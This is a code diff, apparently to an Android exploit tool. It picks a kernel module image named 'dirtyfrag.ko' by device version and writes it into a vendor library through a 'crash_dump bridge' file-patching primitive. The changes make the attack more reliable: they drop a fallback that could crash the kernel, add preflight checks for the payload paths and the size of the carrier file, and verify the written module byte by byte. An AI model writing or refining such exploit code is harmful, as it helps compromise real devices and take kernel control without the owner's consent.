@@ -347,13 +347,12 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
         {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
         {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
     };
-    const struct KoImage *fb = NULL;
     for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
         if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
         if (imgs[i].android_release == andr) return &imgs[i];
-        if (!fb) fb = &imgs[i];
     }
-    return fb;
+    /* A same-version module from another Android KMI can corrupt the kernel. */
+    return NULL;
 }
 
 static int read_device_versions(int *andr, int *major, int *minor) {
@@ -388,6 +387,14 @@ static int patch_ko(struct Reporter *reporter) {
     if (!ko) {
         REPORTLN("unsupported kernel %d.%d android %d", major, minor, andr); return 1;
     }
+    struct stat path_stat, carrier_stat;
+    if (lstat(kCrashDump, &path_stat) != 0 ||
+        stat(libcxx_ko_target, &carrier_stat) != 0 ||
+        lstat("/vendor/bin/insmod", &path_stat) != 0 ||
+        lstat("/system/lib64/libc++.so", &path_stat) != 0) {
+        REPORTLN("required payload path missing; run tools/device_preflight.py first");
+        return 1;
+    }
     REPORTLN("* ko android%d-%d.%d (%d bytes)",
              ko->android_release, ko->kver_major, ko->kver_minor,
              (int)(ko->end - ko->start));
@@ -405,13 +412,38 @@ static int patch_ko(struct Reporter *reporter) {
     free(sh_buf);
     if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
+    uint8_t vendor_header[16];
+    if (read_vendor_content(0, vendor_header, reporter) != 0 ||
+        memcmp(vendor_header, "\x7f" "ELF", 4) != 0) {
+        REPORTLN("vendor carrier read preflight failed; aborting before module write");
+        return 1;
+    }
+
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
+    if ((off_t)ko_len_padded > carrier_stat.st_size) {
+        REPORTLN("vendor carrier is too small: %lld < %zu",
+                 (long long)carrier_stat.st_size, ko_len_padded);
+        free(ko_buf);
+        return 1;
+    }
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
     REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
     ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
+    if (!ret) {
+        uint8_t actual[16];
+        for (size_t off = 0; off < ko_len_padded; off += 16) {
+            if (read_vendor_content((off_t)off, actual, reporter) != 0 ||
+                memcmp(actual, ko_buf + off, 16) != 0) {
+                REPORTLN("module read-back mismatch at 0x%zx", off);
+                ret = 1;
+                break;
+            }
+        }
+        if (!ret) REPORTLN("module read-back verified: %zu bytes", ko_len_padded);
+    }
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
     return ret;
